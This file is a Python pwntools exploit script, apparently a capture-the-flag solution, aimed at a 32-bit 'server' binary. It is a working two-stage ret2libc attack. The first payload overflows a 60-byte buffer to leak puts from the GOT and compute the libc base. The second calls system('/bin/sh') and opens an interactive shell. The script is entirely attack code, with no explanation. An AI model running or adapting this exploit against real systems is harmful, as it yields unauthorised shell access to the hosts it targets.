#!/usr/bin/python3
from pwn import *

#context.log_level = 'debug'
exe = context.binary = ELF("/tmp/patch/server", checksec=False)
libc = ELF("/tmp/libc6_2.27-0ubuntu3_i386.so", checksec=False)

p = process("/tmp/patch/server_patched")
#p = remote()

add_8esp_pop_ebx = 0x080483c6

input()
payload = b'A'*60 
payload += p32(exe.sym['puts'])
payload += p32(exe.sym['vuln'])
payload += p32(exe.got['puts'])

p.sendlineafter(b"Input some text: ", payload)
p.recvuntil(b"Return address: ")
p.recvline()
p.recvline()

puts_leak = u32(p.recvline()[0:4])
log.info("Puts leak:" + hex(puts_leak))
libc.address = puts_leak - libc.sym['puts']
log.info("Libc base:" + hex(libc.address))

payload = b'A'*60 
payload += p32(libc.sym['system'])
payload += p32(exe.sym['vuln'])
payload += p32(next(libc.search(b"/bin/sh\0")))

p.sendlineafter(b"Input some text: ", payload)
p.recvuntil(b"Return address: ")
p.recvline()
p.recvline()

p.interactive()
